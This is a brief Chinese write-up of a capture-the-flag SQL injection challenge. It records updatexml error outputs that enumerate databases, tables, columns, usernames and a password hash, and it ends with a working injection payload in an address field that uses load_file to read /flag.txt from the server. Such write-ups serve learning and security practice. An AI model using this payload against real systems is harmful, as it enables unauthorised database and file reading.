双重注入


schema

```

errorXPATH syntax error: '~information_schema,ctftraining,mysql,performance_schema,ctfusers~'
```

ctfusers库中表

```
errorXPATH syntax error: '~user~'
```

ctftraining表中字段

```
errorXPATH syntax error: '~FLAG_TABLE,news,users~'
```

终于逮到你

```
errorXPATH syntax error: '~FLAG_COLUMN~'
```


news:

```
errorXPATH syntax error: '~id,title,content,time~'

```

ctftraining.users:
```
id,username,password,ip,time


username:
errorXPATH syntax error: '~admin,guest,virink~'

a4346e75cc1dd161a8d57f3b2d5d82d0
```


content 1:

```
The domestic dog (Canis lupus familiaris when considered a subspecies of the wolf or Canis familiaris when considered a distinct species)[4] is a member of the genus Canis (canine

errorXPATH syntax error: '~s), which forms part of the wo~'
errorXPATH syntax error: '~lf-like canids,[5] and is the ~'

errorXPATH syntax error: '~most widely abundant terrestri~'
errorXPATH syntax error: '~al carnivore.,The cat or domes~'
errorXPATH syntax error: '~tic cat (Felis catus) is a sma~'
errorXPATH syntax error: '~ll carnivorous mammal.[1][2] I~'



errorXPATH syntax error: '~ four-chambered heart, and a st'
errorXPATH syntax error: '~trong yet lightweight skeleton.'
errorXPATH syntax error: '~.,Flag is in the database but not here.'



上述都属于误导，事实上flag在根目录

flag is in the /flag.txt

flag{56f1b68a-cbea-40a4-9491-0a
b68a-cbea-40a4-9491-0a7a7b5b31
0a7a7b5b31c7}


flag{56f1b68a-cbea-40a4-9491-0a7a7b5b31c7}

payload:

```
user_name=1&phone=1&address=' and updatexml(0,concat(0x7e,(select load_file("/flag.txt")) ,0x7e)  ,0)#
```